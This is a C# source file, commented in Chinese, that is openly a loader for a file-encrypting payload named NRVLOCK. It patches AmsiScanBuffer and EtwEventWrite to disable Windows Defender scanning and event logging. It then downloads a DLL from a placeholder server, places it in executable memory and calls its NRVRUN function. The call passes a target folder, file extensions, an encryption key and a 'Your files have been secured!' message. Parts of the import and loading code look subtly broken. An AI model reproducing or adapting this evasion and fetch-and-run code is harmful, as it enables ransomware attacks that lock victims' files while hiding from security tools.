using System;
using System.IO;
using System.Net;
using System.Text;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Security.Cryptography;

class 程序
{
    // 🔹 这些参数可以自由修改，以执行 NRVLOCK
    static string target = "C:\\Users\\Public\\Documents";  // 📂 目标目录
    static string extensions = ".txt;.docx";  // 📝 目标文件扩展名
    static string key = "YourEncryptionKey";  // 🔑 加密密钥
    static string lkey = "YourLicenseKey";  // 🔏 许可证密钥
    static bool ViewConsole = true;  // 🖥️ 是否显示控制台
    static string msg = "Your files have been secured!";  // ✉ 自定义消息
    static string dllUrl = "https://yourserver.com/NRVLOCK.dll";  // 🔗 NRVLOCK.dll 下载链接

    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
    private delegate void NRVRUNDelegate(
        string target, string extensions, string key, string lkey, bool ViewConsole, string msg
    );

    static void Main()
    {
        绕过AMSI和ETW(); // 🔥 绕过 Windows Defender 和 ETW 日志

        byte[] dll字节 = 下载DLL(dllUrl);
        
        if (dll字节 == null || dll字节.Length == 0)
        {
            Console.WriteLine("❌ 无法下载 DLL!");
            return;
        }

        IntPtr dll内存 = 加载DLL到内存(dll字节);
        
        if (dll内存 == IntPtr.Zero)
        {
            Console.WriteLine("❌ 无法将 DLL 加载到内存!");
            return;
        }

        Console.WriteLine("✅ DLL 成功加载到内存!");

        IntPtr nrvrunPtr = 获取函数地址(dll内存, "NRVRUN");
        if (nrvrunPtr == IntPtr.Zero)
        {
            Console.WriteLine("❌ 找不到 NRVRUN 函数!");
            return;
        }

        NRVRUNDelegate NRVRUN = Marshal.GetDelegateForFunctionPointer<NRVRUNDelegate>(nrvrunPtr);
        NRVRUN(target, extensions, key, lkey, ViewConsole, msg);

        Console.WriteLine("✅ 执行完成。");
        清除内存(dll字节);
    }

    static byte[] 下载DLL(string url)
    {
        using (WebClient 客户端 = new WebClient())
        {
            try
            {
                Console.WriteLine("🔗 正在隐秘下载 DLL...");
                return 客户端.DownloadData(url);
            }
            catch
            {
                return null;
            }
        }
    }

    static IntPtr 加载DLL到内存(byte[] dllBytes)
    {
        IntPtr dllMemory = VirtualAlloc(IntPtr.Zero, (UIntPtr)dllBytes.Length, 0x1000 | 0x2000, 0x40);
        if (dllMemory == IntPtr.Zero) return IntPtr.Zero;

        Marshal.Copy(dllBytes, 0, dllMemory, dllBytes.Length);
        return dllMemory;
    }

    static void 清除内存(byte[] data)
    {
        if (data != null && data.Length > 0)
        {
            Array.Clear(data, 0, data.Length);
        }
    }

    static void 绕过AMSI和ETW()
    {
        byte[] patch = new byte[] { 0xC3 }; // 返回指令
        IntPtr amsi = 获取函数地址(加载库("amsi.dll"), "AmsiScanBuffer");
        IntPtr etw = 获取函数地址(加载库("ntdll.dll"), "EtwEventWrite");

        if (amsi != IntPtr.Zero)
            Marshal.Copy(patch, 0, amsi, patch.Length);

        if (etw != IntPtr.Zero)
            Marshal.Copy(patch, 0, etw, patch.Length);
    }

    [DllImport("kernel32.dll")]
    static extern IntPtr 加载库(string dllToLoad);

    [DllImport("kernel32.dll")]
    static extern IntPtr 获取函数地址(IntPtr hModule, string procedureName);

    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr VirtualAlloc(IntPtr lpAddress, UIntPtr dwSize, uint flAllocationType, uint flProtect);
}
